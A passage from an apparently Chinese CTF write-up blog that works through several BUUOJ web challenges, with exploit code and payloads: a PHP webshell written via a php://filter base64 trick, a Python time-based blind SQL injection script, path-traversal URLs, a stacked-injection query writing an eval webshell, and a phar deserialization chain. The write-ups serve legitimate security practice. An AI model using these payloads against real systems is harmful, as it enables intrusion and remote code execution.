class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27;));</span><br></code></pre></td></tr></table></figure><p>这里首先将webshellbase64编码，然后再用base64编码绕过死亡exit。为什么加了三个1？</p><p>因为base64解码过程中只认a-zA-z0-9+&#x2F;，所以这一段字符</p><p><code>&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n</code> 在解码过程中只认 <code>php//exit</code> 这里是9个字符，再补三位就是四的倍数。</p><p>然后看这个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-variable">$name</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里不难看出 prefix可控 那name呢</p><p>结合上面想的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">//保存内容  A类</span><br>        <span class="hljs-variable">$contents</span> = <span class="hljs-keyword">$this</span>-&gt;getForStorage();<br>        <span class="hljs-keyword">$this</span>-&gt;store-&gt;set(<span class="hljs-keyword">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-keyword">$this</span>-&gt;expire);<br>    &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>)  //<span class="hljs-title">B</span>类</span><br></code></pre></td></tr></table></figure><p>因为是从save触发 实际给到 B::set的第一个参数时A的key属性</p><p>这是可发现两者 prefix key都是可控的，于是可以有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">options[<span class="hljs-string">&#x27;prefix&#x27;</span>]=<span class="hljs-string">&quot;php://filter/write=convert.base64-decode/resource=./uploads/&quot;</span>;<br>key=<span class="hljs-string">&quot;shell.php&quot;</span>; <span class="hljs-comment">//$name</span><br></code></pre></td></tr></table></figure><p>梳理一下内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">A：<br>    key=<span class="hljs-string">&quot;shell.php&quot;</span>;<br>content=()<br>   complete = base64_encode(<span class="hljs-string">&quot;111&quot;</span>.base64_encode(<span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>));<br>    store=<span class="hljs-keyword">new</span> B();<br>B:<br>    b-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] = <span class="hljs-literal">false</span>;<br>options[<span class="hljs-string">&#x27;prefix&#x27;</span>]=<span class="hljs-string">&quot;php://filter/write=convert.base64-decode/resource=./uploads/&quot;</span>;<br><br></code></pre></td></tr></table></figure><h2 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202071745556.png" alt="image-20220207174506463"></p><p>登录页面抓包，发现可以sql注入</p><p>这里结合 PDO预处理和盲注思想，给了一种新的思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#author: c1e4r</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-comment">#题目地址</span><br>    url = <span class="hljs-string">&#x27;&#x27;&#x27;http://ed59e513-784d-42b5-81d0-2c4dc976d086.node3.buuoj.cn/index.php?r=Login/Index&#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment">#注入payload</span><br>    payloads = <span class="hljs-string">&quot;admin&#x27;;set @a=0x&#123;0&#125;;prepare b from @a;execute b--+&quot;</span><br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>        <span class="hljs-comment">#查询payload</span><br>        payload = <span class="hljs-string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">128</span>):<br>            <span class="hljs-comment">#将构造好的payload进行16进制转码和json转码</span><br>            datas = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payloads.<span class="hljs-built_in">format</span>(str_to_hex(payload.<span class="hljs-built_in">format</span>(i,j))),<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;test213&#x27;</span>&#125;<br>            data = json.dumps(datas)<br>            times = time.time()<br>            res = requests.post(url = url, data = data)<br>            <span class="hljs-keyword">if</span> time.time() - times &gt;= <span class="hljs-number">3</span>:<br>                flag = flag + <span class="hljs-built_in">chr</span>(j)<br>                <span class="hljs-built_in">print</span>(flag)<br>                <span class="hljs-keyword">break</span><br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>之后得到的文件名 glzjin_wants_a_girl_friend.zip</p><p>审计源码 在 \Controller\BaseController.php 发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseController</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 加载视图文件</span><br><span class="hljs-comment"> * viewName 视图名称</span><br><span class="hljs-comment"> * viewData 视图分配数据</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">private</span> <span class="hljs-variable">$viewPath</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadView</span>(<span class="hljs-params"><span class="hljs-variable">$viewName</span> =<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$viewData</span> = []</span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;viewPath = BASE_PATH . <span class="hljs-string">&quot;/View/<span class="hljs-subst">&#123;$viewName&#125;</span>.php&quot;</span>;<br><span class="hljs-keyword">if</span>(file_exists(<span class="hljs-keyword">$this</span>-&gt;viewPath))<br>&#123;<br>extract(<span class="hljs-variable">$viewData</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-keyword">$this</span>-&gt;viewPath;<br>&#125;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里的extract可以变量覆盖，只要可控就可以覆盖点viewpath，然后看一下谁引用了这个类,然后跟进到   \Controller\UserController.php</p><p>这里有 <code>$this-&gt;loadView(&#39;userIndex&#39;,$listData);</code> 随后跟进 userIndex.phpz</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">imgToBase64</span>(<span class="hljs-params"><span class="hljs-variable">$img_file</span></span>) </span>&#123;<br><br>    <span class="hljs-variable">$img_base64</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (file_exists(<span class="hljs-variable">$img_file</span>)) &#123;<br>        <span class="hljs-variable">$app_img_file</span> = <span class="hljs-variable">$img_file</span>; <span class="hljs-comment">// 图片路径</span><br>        <span class="hljs-variable">$img_info</span> = getimagesize(<span class="hljs-variable">$app_img_file</span>); <span class="hljs-comment">// 取得图片的大小，类型等</span><br><br>        <span class="hljs-variable">$fp</span> = fopen(<span class="hljs-variable">$app_img_file</span>, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-comment">// 图片是否可读权限</span><br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$fp</span>) &#123;<br>            <span class="hljs-variable">$filesize</span> = filesize(<span class="hljs-variable">$app_img_file</span>);<br>            <span class="hljs-variable">$content</span> = fread(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$filesize</span>);<br>            <span class="hljs-variable">$file_content</span> = chunk_split(base64_encode(<span class="hljs-variable">$content</span>)); <span class="hljs-comment">// base64编码</span><br>            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$img_info</span>[<span class="hljs-number">2</span>]) &#123;           <span class="hljs-comment">//判读图片类型</span><br>...<br><br>            <span class="hljs-variable">$img_base64</span> = <span class="hljs-string">&#x27;data:image/&#x27;</span> . <span class="hljs-variable">$img_type</span> . <span class="hljs-string">&#x27;;base64,&#x27;</span> . <span class="hljs-variable">$file_content</span>;<span class="hljs-comment">//合成图片的base64编码</span><br><br>        &#125;<br>        fclose(<span class="hljs-variable">$fp</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$img_base64</span>; <span class="hljs-comment">//返回图片的base64</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里就是返回Base64形式的图片，然后$listData可控，这个时候又用到了上面的变量覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadView</span>(<span class="hljs-params"><span class="hljs-variable">$viewName</span> =<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$viewData</span> = []</span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;viewPath = BASE_PATH . <span class="hljs-string">&quot;/View/<span class="hljs-subst">&#123;$viewName&#125;</span>.php&quot;</span>;<br><span class="hljs-keyword">if</span>(file_exists(<span class="hljs-keyword">$this</span>-&gt;viewPath))<br>&#123;<br>extract(<span class="hljs-variable">$viewData</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-keyword">$this</span>-&gt;viewPath;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里自己加载的 &#x2F;View&#x2F; 文件夹下的文件，但是flag.php 在BASE_PATH下（根据目录结构得出），所以要返回上一级目录</p><p><code>?r=User/Index&amp;img_file=/../flag.php</code>  这…这个地方拿到的base64记得删除换行</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202071946757.png" alt="image-20220207194629685"></p><h2 id="网鼎杯-2020-半决赛-AliceWebsite"><a href="#网鼎杯-2020-半决赛-AliceWebsite" class="headerlink" title="[网鼎杯 2020 半决赛]AliceWebsite"></a>[网鼎杯 2020 半决赛]AliceWebsite</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>     <span class="hljs-variable">$action</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] : <span class="hljs-string">&#x27;home.php&#x27;</span>);<br>     <span class="hljs-keyword">if</span> (file_exists(<span class="hljs-variable">$action</span>)) &#123;<br>         <span class="hljs-keyword">include</span> <span class="hljs-variable">$action</span>;<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not found!&quot;</span>;<br>     &#125;<br>     <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://4ef1b285-29ae-416e-8ca4-2b8add5da5de.node4.buuoj.cn:81/index.php?action=../../../flag</code></p><h2 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h2><p>是猜出来二次注入了，但是给我转义掉就不会了</p><p>参考：<a href="https://blog.csdn.net/qq_45691294/article/details/109001695">https://blog.csdn.net/qq_45691294/article/details/109001695</a></p><p>堆叠注入没太看出来…. 这里尝试用堆叠注入结合PDO写shell</p><p><code>select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39; into outfile &#39;/var/www/html/favicon/shell.php</code></p><p>原始payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;select &#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell.php&#x27;;&quot;</span><br>len_str=<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,len_str):<br><span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;char(%s&#x27;</span>%<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;,%s&#x27;</span>%<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;)&#x27;</span>)<br><span class="hljs-comment">#char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59)</span><br></code></pre></td></tr></table></figure><p><code>?id=3;set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query;</code></p><p>然后蚁剑连接即可</p><h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p>u:admin    p:password</p><p>到达文件上传的地方发现可以读取源码</p><p><code>http://29fc5b9f-3437-4e77-8c04-9b780b878ab4.node4.buuoj.cn:81/home.php?file=php://filter/convert.base64-encode/resource=upload</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Uploader</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$Filename</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$sandbox</span> = getcwd().<span class="hljs-string">&quot;/uploads/&quot;</span>.md5(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]).<span class="hljs-string">&quot;/&quot;</span>;<br><span class="hljs-variable">$ext</span> = <span class="hljs-string">&quot;.txt&quot;</span>;<br>@mkdir(<span class="hljs-variable">$sandbox</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> !preg_match(<span class="hljs-string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))&#123;<br><span class="hljs-keyword">$this</span>-&gt;Filename = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;Filename = <span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>].<span class="hljs-variable">$ext</span>;<br>&#125;<br><br><span class="hljs-keyword">$this</span>-&gt;cmd = <span class="hljs-string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;<br><span class="hljs-keyword">$this</span>-&gt;token = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$sandbox</span>;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$ext</span>;<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;[^a-z0-9]&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;Filename))&#123;<br><span class="hljs-keyword">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1024</span>)&#123;<br><span class="hljs-keyword">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;cmd = <span class="hljs-string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;Filename . <span class="hljs-string">&quot;&#x27;);&quot;</span>;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$sandbox</span>;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$ext</span>;<br><span class="hljs-comment">// return $sandbox.$this-&gt;Filename.$ext;</span><br><span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;Filename;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;token != <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>])&#123;<br><span class="hljs-keyword">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;cmd);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br><span class="hljs-variable">$uploader</span> = <span class="hljs-keyword">new</span> Uploader();<br><span class="hljs-variable">$uploader</span>-&gt;upload(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br><span class="hljs-keyword">if</span>(@file_get_contents(<span class="hljs-variable">$uploader</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="hljs-variable">$uploader</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$uploader</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>​    发现 line 52可以执行命令切cmd可控 接下来只要满足session相等就行 这里题目已经给出了</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202072145163.png" alt="image-20220207214544095"></p><p>然后这题没有限制phar协议，又没有明显的反序列化点那应该就是phar反序列化了</p><p>有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Uploader</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$Filename</span>=<span class="hljs-string">&#x27;1&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br><span class="hljs-comment">//public $cmd=&#x27;highlight_file(&quot;/var/www/html/flag.php&quot;);&#x27;;</span><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;GXY90fa8abf0924af8361e694e35b6ea0e6&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Uploader();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;startBuffering();<br><span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif文件头</span><br><span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$a</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br><br></code></pre></td></tr></table></figure><p>然后用phar协议去触发它</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">29</span>fc<span class="hljs-number">5</span>b<span class="hljs-number">9</span>f-<span class="hljs-number">3437</span>-<span class="hljs-number">4</span>e<span class="hljs-number">77</span>-<span class="hljs-number">8</span>c<span class="hljs-number">04</span>-<span class="hljs-number">9</span>b<span class="hljs-number">780</span>b<span class="hljs-number">878</span>ab<span class="hljs-number">4</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/home.php?file=upload&amp;name=phar:///var/www/html/uploads/<span class="hljs-number">1</span>b<span class="hljs-number">78</span>f<span class="hljs-number">2546892</span>a<span class="hljs-number">5</span>da<span class="hljs-number">1</span>ab<span class="hljs-number">41</span>abcacd<span class="hljs-number">8422</span>a/GXYdc<span class="hljs-number">195</span>f<span class="hljs-number">23050</span>d<span class="hljs-number">5</span>bb<span class="hljs-number">2</span>c<span class="hljs-number">332587688292</span>bbe.txt<br></code></pre></td></tr></table></figure><p>这里我自己做了好几遍所以…这个沙箱和上面有出入</p><p>然后再随便上传一个 触发__destruct方法就行</p><h2 id="Black-Watch-入群题"><a href="#Black-Watch-入群题" class="headerlink" title="[Black Watch 入群题]"></a>[Black Watch 入群题]</h2><p>可能是环境坏了 一开始自己的脚本啥也跑不出来，别人的也是乱码。有点麻</p><p>这题和其他异或二分不同的是 这里返回的是json数据做if in判断的需要先json转换然后转成str</p><p><code> text = 